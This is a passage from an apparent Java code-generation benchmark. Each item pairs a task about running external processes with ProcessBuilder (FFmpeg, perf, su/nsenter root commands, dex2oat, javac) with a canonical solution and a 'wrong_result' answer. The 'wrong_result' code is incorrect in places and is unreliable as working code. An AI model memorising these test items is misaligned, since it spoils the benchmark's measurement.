    "wrong_result": "public class PerfMonitor {\n    private String sampleFrequency;\n    private java.util.OptionSpec<String> optFrequency;\n    private java.io.File perfBinData;\n    private java.io.File perfParsedData;\n    private java.util.Collection<String> requestedEventNames;\n\n    public void parseEvents() {\n        try {\n            java.lang.ProcessBuilder pb = new java.lang.ProcessBuilder(\"perf\", \"script\");\n            pb.redirectInput(perfBinData);\n            pb.redirectOutput(perfParsedData);\n            java.lang.Process process = pb.start();\n            drainStream(process.getErrorStream(), java.lang.System.err);\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                throw new java.lang.RuntimeException(\"perf script failed with exit code \" + exitCode);\n            }\n        } catch (java.io.IOException | java.lang.InterruptedException e) {\n            throw new java.lang.RuntimeException(\"Error parsing perf data\", e);\n        }\n    }\n\n    public java.util.Collection<String> addJVMInvokeOptions(BenchmarkParams params) {\n        java.util.List<String> options = new java.util.ArrayList<>();\n        if (sampleFrequency != null) {\n            options.add(\"--freq\");\n            options.add(sampleFrequency);\n        }\n        for (String eventName : requestedEventNames) {\n            options.add(\"--event\");\n            options.add(eventName);\n        }\n        options.add(\"--output\");\n        options.add(perfBinData.getAbsolutePath());\n        return options;\n    }\n\n    private static void drainStream(java.io.InputStream in, java.io.OutputStream out) {\n        byte[] buffer = new byte[1024];\n        int len;\n        try {\n            while ((len = in.read(buffer)) > 0) {\n                out.write(buffer, 0, len);\n            }\n        } catch (java.io.IOException e) {\n            // Handle error\n        }\n    }\n}"
  },
  {
    "Task_id": 278,
    "Instruction": "Task Description: Create a Java function that executes an FFmpeg process to convert a video file into NUT format with raw video and audio codecs, then reads and processes the output using a NutReader.\n\nFunction Description: The function testNutReader() configures and executes an FFmpeg process to convert an input video file into NUT format with specific codec settings (rawvideo for video, pcm_s32le for audio). It then reads and processes the output stream using a NutReader with custom handlers for stream and frame events. The function ensures proper process synchronization by waiting for the FFmpeg process to complete.\n\nInput: None (uses a predefined input file Samples.big_buck_bunny_720p_1mb)\n\nOutput: None (void return type), but the function:\n1. Executes an FFmpeg conversion process\n2. Processes the output through NutReader callbacks\n3. Asserts the process completed successfully (exit code 0)\n\nExceptions:\n- InterruptedException: If the thread is interrupted while waiting for the process\n- ExecutionException: If there's an error in process execution\n- IOException: If there's an I/O error during process handling\n- LineUnavailableException: If there's an audio line availability issue",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.List;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport javax.sound.sampled.LineUnavailableException;\n\npublic void testNutReader()\n    throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n\n    List<String> args =\n        new FFmpegBuilder()\n            .setInput(Samples.big_buck_bunny_720p_1mb)\n            .done()\n            .addStdoutOutput()\n            .setFormat(\"nut\")\n            .setVideoCodec(\"rawvideo\")\n            .setVideoPixelFormat(\"argb\")\n            .setAudioCodec(\"pcm_s32le\")\n            .done()\n            .build();\n\n    List<String> newArgs =\n        ImmutableList.<String>builder().add(FFmpeg.DEFAULT_PATH).addAll(args).build();\n\n    ProcessBuilder builder = new ProcessBuilder(newArgs);\n    Process p = builder.start();\n\n    new NutReader(\n            p.getInputStream(),\n            new NutReaderListener() {\n                @Override\n                public void stream(Stream stream) {\n                    // Audio stream handling logic\n                }\n\n                @Override\n                public void frame(Frame frame) {\n                    // Frame processing logic\n                }\n            })\n        .read();\n\n    assertEquals(0, p.waitFor());\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public void testNutReader() throws InterruptedException, ExecutionException, IOException, LineUnavailableException {\n    ProcessBuilder pb = new ProcessBuilder(\"ffmpeg\", \"-i\", \"Samples.big_buck_bunny_720p_1mb\", \"-f\", \"nut\", \"-c:v\", \"rawvideo\", \"-c:a\", \"pcm_s32le\", \"-\");\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    InputStream inputStream = process.getInputStream();\n    NutReader reader = new NutReader(inputStream);\n    reader.setStreamHandler((event) -> {\n        // Custom stream event handling\n    });\n    reader.setFrameHandler((event) -> {\n        // Custom frame event handling\n    });\n    int exitCode = process.waitFor();\n    if (exitCode != 0) {\n        throw new ExecutionException(\"FFmpeg exited with code \" + exitCode);\n    }\n}"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Create utility functions for working with FileChannel in Java NIO to provide OutputStream functionality with optional force-write capability at close.\n\nFunction Description: The provided code consists of three utility functions that work together to create an OutputStream wrapper around a FileChannel, with control over whether changes are forcibly written to disk when closing the stream.\n\nInput:\n1. For newOutputStream:\n   - channel: FileChannel - The FileChannel to wrap with OutputStream functionality\n   - forceAtClose: boolean - Whether to force write changes to disk when closing\n\n2. For newOutputStreamForceAtClose:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\n3. For newFileChannel:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\nOutput:\n1. For newOutputStream: OutputStream - A new OutputStream instance that writes to the provided FileChannel\n2. For newOutputStreamForceAtClose: OutputStream - A new OutputStream instance that forces writes to disk when closed\n3. For newFileChannel: FileChannel - A new FileChannel instance for the specified path with given options",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\nstatic OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n    final byte[] single = {0};\n    return new OutputStream() {\n        @Override\n        public void write(int b) throws IOException {\n            single[0] = (byte) b;\n            write(single);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            for(; len > 0; ) {\n                final int written = channel.write(ByteBuffer.wrap(b, off, len));\n                off += written;\n                len -= written;\n            }\n        }\n\n        @Override\n        public void close() throws IOException {\n            try (FileChannel c = channel) {\n                if (forceAtClose) {\n                    c.force(true);\n                }\n            }\n        }\n    };\n}\n\nstatic OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n    return newOutputStream(newFileChannel(p, options), true);\n}\n\nstatic FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n    return LogUtils.supplyAndLog(LOG,\n        () -> FileChannel.open(p, options),\n        () -> \"FileChannel.open \" + p + \" with options \" + Arrays.asList(options));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class FileChannelUtils {\n    public static OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n        return new CustomOutputStream(channel, forceAtClose);\n    }\n\n    public static OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n        FileChannel channel = newFileChannel(p, options);\n        return newOutputStream(channel, true);\n    }\n\n    public static FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n        return Files.newByteChannel(p, options);\n    }\n\n    private static class CustomOutputStream extends OutputStream {\n        private final FileChannel channel;\n        private final boolean forceAtClose;\n\n        public CustomOutputStream(FileChannel channel, boolean forceAtClose) {\n            this.channel = channel;\n            this.forceAtClose = forceAtClose;\n        }\n\n        @Override\n        public void write(int b) throws IOException {\n            ByteBuffer buffer = ByteBuffer.allocate(1);\n            buffer.put((byte) b);\n            buffer.flip();\n            channel.write(buffer);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            ByteBuffer buffer = ByteBuffer.wrap(b, off, len);\n            channel.write(buffer);\n        }\n\n        @Override\n        public void write(byte[] b) throws IOException {\n            write(b, 0, b.length);\n        }\n\n        @Override\n        public void close() throws IOException {\n            if (forceAtClose) {\n                channel.force(true);\n            }\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 280,
    "Instruction": "Task Description: Implement a Java function that executes a shell command with root privileges using ProcessBuilder, handles input/output streams, and properly manages process lifecycle and error handling.\n\nFunction Description: The function executes a given shell command with root privileges by spawning a new process through ProcessBuilder. It uses 'su' to gain root access and 'nsenter' to enter the root namespace. The function handles command safety checks, process I/O streams, error redirection, and proper resource cleanup. It returns the command output or error messages.\n\nInput: \n- cmd: String - The shell command to be executed with root privileges\n\nOutput: \n- String - The output of the executed command (stdout) or error message if execution fails. The output string is cleaned to remove trailing newlines and unnecessary error prefixes.\n\nNote: The function includes a safety check (isSafeCommand) to prevent dangerous operations, though its implementation isn't shown in the reference code.",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic static String rootExecCmd(String cmd) {\n    if (!isSafeCommand(cmd)) return \"Cannot exec this command: Dangerous operation\";\n    StringBuilder result = new StringBuilder();\n    ProcessBuilder pb = new ProcessBuilder(\"su\");\n    Process p;\n    DataOutputStream dos = null;\n    DataInputStream dis = null;\n    try {\n        pb.redirectErrorStream(true);\n        p = pb.start();\n        dos = new DataOutputStream(p.getOutputStream());\n        dis = new DataInputStream(p.getInputStream());\n        dos.writeBytes(\"nsenter --mount=/proc/1/ns/mnt -- \" + cmd + \"\\n\");\n        dos.flush();\n        dos.writeBytes(\"exit\\n\");\n        dos.flush();\n        String line;\n        while ((line = dis.readLine()) != null) {\n            result.append(line).append(\"\\n\");\n        }\n        p.waitFor();\n    } catch (Exception e) {\n        if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n            return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n        } else {\n            return String.valueOf(e);\n        }\n    } finally {\n        if (dos != null) {\n            try {\n                dos.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n        if (dis != null) {\n            try {\n                dis.close();\n            } catch (IOException e) {\n                if (!cmd.contains(\"nsenter\") && String.valueOf(e).contains(\"nsenter: exec \")) {\n                    return String.valueOf(e).replace(\"nsenter: exec \", \"\");\n                } else {\n                    return String.valueOf(e);\n                }\n            }\n        }\n    }\n    if (result.length() > 0) {\n        result = new StringBuilder(result.substring(0, result.length() - 1));\n    }\n    if (!cmd.contains(\"nsenter\") && result.toString().contains(\"nsenter: exec \")) {\n        return result.toString().replace(\"nsenter: exec \", \"\");\n    } else {\n        return result.toString();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public String executeRootCommand(String cmd) {\n    if (!isSafeCommand(cmd)) {\n        return \"Error: Command is not safe.\";\n    }\n\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", cmd);\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n\n        int exitCode = process.waitFor();\n\n        String result = output.toString().trim();\n        if (exitCode != 0) {\n            result = result.replaceAll(\"^error:\\\\s*\", \"\");\n        }\n\n        return result;\n    } catch (Exception e) {\n        return \"Error: \" + e.getMessage();\n    }\n}"
  },
  {
    "Task_id": 281,
    "Instruction": "Task Description: Create a function that executes an external process, captures its output (including error streams redirected to standard output), and returns the output as a string.\n\nFunction Description: The function uses Java's ProcessBuilder to start an external process specified by the given command. It redirects the error stream to the standard output stream to capture all output in one place. The function reads the process's output stream line by line, collects it into a string, and waits for the process to complete before returning the collected output.\n\nInput: \n- cmd: String[] - An array of strings representing the command to execute and its arguments.\n\nOutput: \n- String - The combined standard output and error output of the executed process, trimmed of any leading or trailing whitespace.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic static String getProcessOutput(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n    processBuilder.redirectErrorStream(true);\n    Process process = processBuilder.start();\n    StringBuilder processOutput = new StringBuilder();\n    try (BufferedReader processOutputReader = new BufferedReader(\n            new InputStreamReader(process.getInputStream()));) {\n        String readLine;\n        while ((readLine = processOutputReader.readLine()) != null) {\n            processOutput.append(readLine + System.lineSeparator());\n        }\n        process.waitFor();\n    }\n    return processOutput.toString().trim();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public static String executeCommand(String[] cmd) throws IOException, InterruptedException {\n    ProcessBuilder pb = new ProcessBuilder(cmd);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    StringBuilder output = new StringBuilder();\n    String line;\n    while ((line = reader.readLine()) != null) {\n        output.append(line).append(\"\\n\");\n    }\n    int exitCode = process.waitFor();\n    return output.toString().trim();\n}"
  },
  {
    "Task_id": 282,
    "Instruction": "Task Description: Create a Java function that executes an external process using ProcessBuilder, captures its output, and handles errors appropriately.\n\nFunction Description: The function executes a shell command constructed from configuration parameters, captures the process's standard output and error streams (merged), waits for the process to complete, and returns the exit status or throws an exception if the process fails. The function handles process initialization, stream reading, and error management.\n\nInput:\n- job: Job<Object> - A job object containing configuration details\n- parameters: Map<String, Object> - A map of parameters used to construct the shell command\n\nOutput:\n- Object - Returns 0 if the process exits successfully, otherwise throws a HugeException containing the exit code and process output\n\nNote: The function includes error handling for process initialization, execution, and stream reading, with all exceptions wrapped in HugeException. The process's working directory is set to executeDir(), and error streams are redirected to standard output.",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStreamReader;\nimport java.io.LineNumberReader;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic Object call(Job<Object> job, Map<String, Object> parameters) {\n    this.checkAndCollectParameters(parameters);\n    try {\n        this.initializeConfig((ComputerJob) job);\n    } catch (Exception e) {\n        throw new HugeException(\n                \"Failed to initialize computer config file\", e);\n    }\n\n    Map<String, Object> configs = new HashMap<>();\n    configs.putAll(this.commonConfig);\n    configs.putAll(this.checkAndCollectParameters(parameters));\n\n    String[] command = this.constructShellCommands(configs);\n    LOG.info(\"Execute computer job: {}\", String.join(SPACE, command));\n\n    try {\n        ProcessBuilder builder = new ProcessBuilder(command);\n        builder.redirectErrorStream(true);\n        builder.directory(new File(executeDir()));\n\n        Process process = builder.start();\n\n        StringBuilder output = new StringBuilder();\n        try (LineNumberReader reader = new LineNumberReader(\n                new InputStreamReader(\n                        process.getInputStream()))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode == 0) {\n            return 0;\n        }\n\n        throw new HugeException(\"The computer job exit with code %s: %s\",\n                                exitCode, output);\n    } catch (HugeException e) {\n        throw e;\n    } catch (Throwable e) {\n        throw new HugeException(\"Failed to execute computer job\", e);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public Object executeJob(Job<Object> job, Map<String, Object> parameters) throws HugeException {\n    try {\n        List<String> command = new ArrayList<>();\n        for (Map.Entry<String, Object> entry : parameters.entrySet()) {\n            command.add(entry.getValue().toString());\n        }\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.directory(job.executeDir());\n        pb.redirectErrorStream(true);\n        Process process = pb.start();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new HugeException(exitCode, output.toString());\n        }\n        return 0;\n    } catch (Exception e) {\n        throw new HugeException(e.getMessage(), e);\n    }\n}"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a Java class that executes shell commands, handling both simple commands and those requiring shell interpretation (with wildcards or special characters). The class should manage process execution, input/output streams, and error handling.\n\nClass Description: ShellCommand is a concrete implementation of AbstractCommand that executes shell commands either directly or through a shell interpreter when needed. It handles command tokenization, process building, and execution status reporting.\n\nAttributes:\n- command: String - The raw shell command to be executed\n- argv: List<String> - The tokenized command arguments, potentially including shell interpreter when needed\n- shellWildcardPattern: Pattern - Compiled regex pattern to detect shell special characters\n\nMethods:\n- ShellCommand(String command) -> None - Constructor that initializes the command and determines if shell interpretation is needed\n- hasWildcard(String command) -> boolean - Checks if the command contains shell wildcard characters that require interpretation\n- tokenize(String s) -> List<String> - Splits a command string into individual tokens for process execution\n- doExecute(ConcurrentTestCommandExecutor executor) -> None - Executes the command using ProcessBuilder, handles I/O streams, and reports execution status",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.Reader;\nimport java.io.Writer;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\nprivate final Pattern shellWildcardPattern = Pattern.compile(\"[*?$|<>&]\");\n\nstatic int runAppProcess(\n    ProcessBuilder pb,\n    Logger logger,\n    Reader appInput,\n    Writer appOutput) throws IOException, InterruptedException {\n  pb.redirectErrorStream(true);\n  if (logger != null) {\n    logger.info(\"start process: \" + pb.command());\n  }\n  Process p = pb.start();\n\n  if (appInput != null) {\n    OutputStream out =\n        new BufferedOutputStream(\n            p.getOutputStream(),\n            100 * 1024);\n    int c;\n    while ((c = appInput.read()) != -1) {\n      out.write(c);\n    }\n    out.flush();\n  }\n  if (appOutput != null) {\n    InputStream in =\n        new BufferedInputStream(\n            p.getInputStream(),\n            100 * 1024);\n    int c;\n    while ((c = in.read()) != -1) {\n      appOutput.write(c);\n    }\n    appOutput.flush();\n    in.close();\n  }\n  p.waitFor();\n\n  int status = p.exitValue();\n  if (logger != null) {\n    logger.info(\"exit status=\" + status + \" from \" + pb.command());\n  }\n  return status;\n}\n\nprivate class ShellCommand extends AbstractCommand {\n  private final String command;\n  private List<String> argv;\n\n  private ShellCommand(String command) {\n    this.command = command;\n    boolean needShell = hasWildcard(command);\n    if (needShell) {\n      argv = new ArrayList<>();\n      argv.add(\"/bin/sh\");\n      argv.add(\"-c\");\n      argv.add(command);\n    } else {\n      argv = tokenize(command);\n    }\n  }\n\n  private boolean hasWildcard(String command) {\n    return shellWildcardPattern.matcher(command).find();\n  }\n\n  private List<String> tokenize(String s) {\n    List<String> result = new ArrayList<>();\n    StringTokenizer tokenizer = new StringTokenizer(s);\n    while (tokenizer.hasMoreTokens()) {\n      result.add(tokenizer.nextToken());\n    }\n    return result;\n  }\n\n  protected void doExecute(ConcurrentTestCommandExecutor executor) {\n    Integer threadId = executor.getThreadId();\n    storeMessage(threadId, command);\n\n    ProcessBuilder pb = new ProcessBuilder(argv);\n    pb.directory(scriptDirectory);\n    try {\n      int status = runAppProcess(pb, null, null, getThreadWriter(threadId));\n      if (status != 0) {\n        storeMessage(threadId,\n            \"command \" + command + \": exited with status \" + status);\n      }\n    } catch (Exception e) {\n      storeMessage(threadId,\n          \"command \" + command + \": failed with exception \" + e.getMessage());\n    }\n  }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellCommand extends AbstractCommand {\n    private final String command;\n    private final List<String> argv;\n    private final boolean shellNeeded;\n    private static final Pattern shellWildcardPattern = Pattern.compile(\"[*?[]\");\n\n    public ShellCommand(String command) {\n        this.command = command;\n        this.shellNeeded = hasWildcard(command);\n        if (shellNeeded) {\n            this.argv = Collections.singletonList(command);\n        } else {\n            this.argv = tokenize(command);\n        }\n    }\n\n    private boolean hasWildcard(String command) {\n        return shellWildcardPattern.matcher(command).find();\n    }\n\n    private List<String> tokenize(String s) {\n        return Arrays.asList(s.trim().split(\"\\\\s+\"));\n    }\n\n    @Override\n    public void doExecute(ConcurrentTestCommandExecutor executor) {\n        ProcessBuilder pb;\n        if (shellNeeded) {\n            pb = new ProcessBuilder(\"sh\", \"-c\", command);\n        } else {\n            pb = new ProcessBuilder(argv);\n        }\n        try {\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            StringBuilder output = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n            StringBuilder error = new StringBuilder();\n            while ((line = errorReader.readLine()) != null) {\n                error.append(line).append(\"\\n\");\n            }\n            int exitCode = process.waitFor();\n            executor.reportExecutionStatus(this, exitCode, output.toString(), error.toString());\n        } catch (IOException | InterruptedException e) {\n            executor.reportExecutionStatus(this, -1, \"\", \"Error executing command: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 284,
    "Instruction": "Task Description: Create a Java class that facilitates the conversion of DEX files to OAT files using the Android dex2oat tool, handling process execution and stream management.\n\nClass Description: InterpretDex2OatHelper is a utility class that provides functionality to convert Android DEX files to OAT files by invoking the system's dex2oat tool. It handles process creation, stream consumption, and error checking during the conversion process.\n\nAttributes:\n- STREAM_CONSUMER: [Executor] - A single-thread executor used for consuming process output streams asynchronously.\n\nMethods:\n- getCurrentInstructionSet: () -> [String] - Retrieves the current instruction set architecture of the device using reflection.\n- interpretDex2Oat: (String dexFilePath, String oatFilePath) -> [void] - Main method that executes the dex2oat conversion process with appropriate parameters.\n- consumeInputStream: (InputStream is) -> [void] - Helper method that asynchronously consumes an input stream to prevent process blocking.\n\nMethod Details:\n1. getCurrentInstructionSet:\n   - Input: None\n   - Output: String representing the current instruction set\n   - Description: Uses reflection to call VMRuntime.getCurrentInstructionSet()\n\n2. interpretDex2Oat:\n   - Input: \n     - dexFilePath: String - Path to the input DEX file\n     - oatFilePath: String - Path for the output OAT file\n   - Output: void (throws IOException on failure)\n   - Description: \n     - Prepares the dex2oat command with version-specific parameters\n     - Creates and manages the conversion process\n     - Handles stream consumption and process termination\n\n3. consumeInputStream:\n   - Input: \n     - is: InputStream - Stream to be consumed\n   - Output: void\n   - Description: Asynchronously reads and discards stream contents to prevent blocking",
    "Canonical_solution": "import android.os.Build;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n\n    private static String getCurrentInstructionSet() throws Exception {\n        Class<?> clazz = Class.forName(\"dalvik.system.VMRuntime\");\n        Method currentGet = clazz.getDeclaredMethod(\"getCurrentInstructionSet\");\n        return (String) currentGet.invoke(null);\n    }\n\n    public static void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String targetISA = null;\n        try {\n            targetISA = getCurrentInstructionSet();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        final File oatFile = new File(oatFilePath);\n        if (!oatFile.exists()) {\n            oatFile.getParentFile().mkdirs();\n        }\n\n        final List<String> commandAndParams = new ArrayList<>();\n        commandAndParams.add(\"dex2oat\");\n\n        if (Build.VERSION.SDK_INT >= 24) {\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"-classpath\");\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"&\");\n        }\n        commandAndParams.add(\"--dex-file=\" + dexFilePath);\n        commandAndParams.add(\"--oat-file=\" + oatFilePath);\n        commandAndParams.add(\"--instruction-set=\" + targetISA);\n\n        if (Build.VERSION.SDK_INT > 25) {\n            commandAndParams.add(\"--compiler-filter=quicken\");\n        } else {\n            commandAndParams.add(\"--compiler-filter=interpret-only\");\n        }\n\n        final ProcessBuilder pb = new ProcessBuilder(commandAndParams);\n        pb.redirectErrorStream(true);\n        final Process dex2oatProcess = pb.start();\n\n        StreamConsumer.consumeInputStream(dex2oatProcess.getInputStream());\n        StreamConsumer.consumeInputStream(dex2oatProcess.getErrorStream());\n\n        try {\n            final int ret = dex2oatProcess.waitFor();\n            if (ret != 0) {\n                throw new IOException(\"dex2oat works unsuccessfully, exit code: \" + ret);\n            }\n        } catch (InterruptedException e) {\n            throw new IOException(\"dex2oat is interrupted, msg: \" + e.getMessage(), e);\n        }\n    }\n\n    private static class StreamConsumer {\n        static final Executor STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n        static void consumeInputStream(final InputStream is) {\n            STREAM_CONSUMER.execute(new Runnable() {\n                @Override\n                public void run() {\n                    if (is == null) {\n                        return;\n                    }\n                    final byte[] buffer = new byte[256];\n                    try {\n                        while ((is.read(buffer)) > 0) {\n                            // To satisfy checkstyle rules.\n                        }\n                    } catch (IOException ignored) {\n                        // Ignored.\n                    } finally {\n                        try {\n                            is.close();\n                        } catch (Exception ignored) {\n                            // Ignored.\n                        }\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class InterpretDex2OatHelper {\n    private static final ExecutorService STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n    private String getCurrentInstructionSet() {\n        try {\n            Class<?> vmRuntimeClass = Class.forName(\"android.os.VMRuntime\");\n            Method method = vmRuntimeClass.getMethod(\"getCurrentInstructionSet\");\n            return (String) method.invoke(null);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to get instruction set\", e);\n        }\n    }\n\n    public void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String instructionSet = getCurrentInstructionSet();\n        String[] cmd = {\n            \"dex2oat\",\n            \"--dex-file=\" + dexFilePath,\n            \"--oat-file=\" + oatFilePath,\n            \"--instruction-set=\" + instructionSet\n        };\n\n        Process process = Runtime.getRuntime().exec(cmd);\n\n        STREAM_CONSUMER.execute(() -> consumeInputStream(process.getInputStream()));\n        STREAM_CONSUMER.execute(() -> consumeInputStream(process.getErrorStream()));\n\n        int exitCode = process.waitFor();\n\n        if (exitCode != 0) {\n            throw new IOException(\"dex2oat failed with exit code \" + exitCode);\n        }\n    }\n\n    private void consumeInputStream(InputStream is) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Discard the line\n            }\n        } catch (IOException e) {\n            // Handle or log the exception\n        }\n    }\n}"
  },
  {
    "Task_id": 285,
    "Instruction": "Task Description: Create a function that retrieves the version of the Java compiler installed on the system by executing the 'javac -version' command and capturing its output.\n\nFunction Description: The function uses Java's ProcessBuilder to launch an external process running the 'javac -version' command. It captures the command's output (which is redirected from stderr to stdout), reads the first line of output, and returns it as the version string. If any errors occur during this process, the function returns \"unknown\".\n\nInput: None (The function takes no input parameters)\n\nOutput: String - Returns the version string output by the 'javac -version' command (e.g., \"javac 1.8.0_291\"), or \"unknown\" if an error occurs during execution.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.lang.ProcessBuilder;\n\nprivate String getJavaCompilerVersion() {\n    ProcessBuilder pb = new ProcessBuilder(\"javac\", \"-version\");\n    pb.redirectErrorStream(true);\n\n    BufferedReader in = null;\n    try {\n        Process process = pb.start();\n        in = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String buffer = in.readLine();\n        process.waitFor();\n        return buffer;\n    } catch (Exception e) {\n        return \"unknown\";\n    } finally {\n        if (in != null) {\n            try {\n                in.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class JavaCompilerVersion {\n    public static String getVersion() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"javac\", \"-version\");\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String version = reader.readLine();\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                return \"unknown\";\n            }\n            return version != null ? version : \"unknown\";\n        } catch (Exception e) {\n            return \"unknown\";\n        }\n    }\n}"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Create a Java class that manages an interactive shell process (either regular or root) with proper stream handling, command execution, and event notification capabilities.\n\nClass Description: The ShellStream class provides an interface to execute commands in a shell process (sh or su) while managing input/output streams and notifying listeners about process events. It handles command execution synchronization, stream monitoring, and process lifecycle management.\n\nAttributes:\n- mConnection: Process - The running shell process instance\n- mStdInput: DataOutputStream - Stream for writing commands to the process\n- mStdOutput: BufferedReader - Stream for reading process output\n- mStdOutputWorker: Thread - Worker thread for monitoring output stream\n- mListener: OnStreamListener - Callback interface for process events\n- mCounter: Counter - Thread-safe counter for active commands\n- mLock: Object - Synchronization lock object\n- mIsActive: Boolean - Flag indicating if the process is active\n- mIsRoot: Boolean - Flag indicating if using root shell (su)\n- mCommandEnd: String - Unique marker for command termination\n\nMethods:\n- ShellStream(Boolean requestRoot, OnStreamListener listener) -> void - Constructor that initializes the shell process (root or regular) and sets up stream handlers\n- execute(String command) -> void - Executes a shell command asynchronously and tracks its completion\n- waitFor() -> Boolean - Waits indefinitely for all commands to complete\n- waitFor(Integer timeout) -> Boolean - Waits with timeout for all commands to complete\n- waitFor(Integer timeout, Integer index) -> Boolean - Internal wait method with timeout and counter adjustment\n- isActive() -> Boolean - Returns if the shell process is active\n- isRunning() -> Boolean - Returns if any commands are currently executing\n- isRoot() -> Boolean - Returns if using root shell\n- destroy() -> void - Cleanly terminates the shell process and releases resources\n\nNested Interfaces:\n- OnStreamListener: Interface for process event callbacks\n  - onStreamStart(): Notifies when command execution starts\n  - onStreamInput(String): Provides process output lines\n  - onStreamStop(Integer): Notifies when command completes with exit code\n  - onStreamDied(): Notifies when process terminates unexpectedly\n\nNested Classes:\n- Counter: Thread-safe counter implementation\n  - size() -> Integer: Gets current count\n  - encrease() -> Integer: Increments 